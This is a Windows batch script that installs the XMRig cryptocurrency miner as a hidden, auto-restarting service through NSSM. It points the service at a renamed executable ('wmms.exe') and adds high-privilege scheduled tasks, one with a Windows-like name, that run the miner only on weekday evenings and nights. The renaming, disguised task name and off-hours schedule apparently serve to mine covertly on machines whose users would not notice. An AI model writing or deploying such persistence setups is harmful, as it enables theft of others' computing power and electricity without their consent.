@echo off

REM ::install new service

cd /D "%~dp0"
nssm install XMRIGService "%cd%\xmrig.exe"
echo %cd%

nssm set XMRIGService Application "%cd%\wmms.exe"
nssm set XMRIGService AppDirectory "%cd%"

nssm set XMRIGService DisplayName XMRIGService
nssm set XMRIGService Description XMRIGService Description
nssm set XMRIGService Start SERVICE_DEMAND_START

nssm set XMRIGService AppPriority IDLE_PRIORITY_CLASS
nssm set XMRIGService AppNoConsole 1
nssm set XMRIGService AppAffinity All

nssm set XMRIGService AppThrottle 1500
nssm set XMRIGService AppExit Default Restart
nssm set XMRIGService AppRestartDelay 0


REM ::set schedule

SchTasks /Create /RL HIGHEST /SC WEEKLY /D MON,TUE,WED,THU,FRI /TN "XMRIGService Start Task" /TR "%cd%\starts.cmd" /ST 19:05
SchTasks /Create /RL HIGHEST /SC WEEKLY /D MON,TUE,WED,THU,FRI /TN "Windows MM Stop Task" /TR "%cd%\stops.cmd" /ST 09:55

timeout 5

REM ::CLEAR ENVIRONMENT
REM ::DELETE SERVICE
REM nssm remove XMRIGService confirm
REM ::DELETE TASKS
REM SCHTASKS /Delete /TN "XMRIGService Start Task" /F
REM SCHTASKS /Delete /TN "XMRIGService Stop Task" /F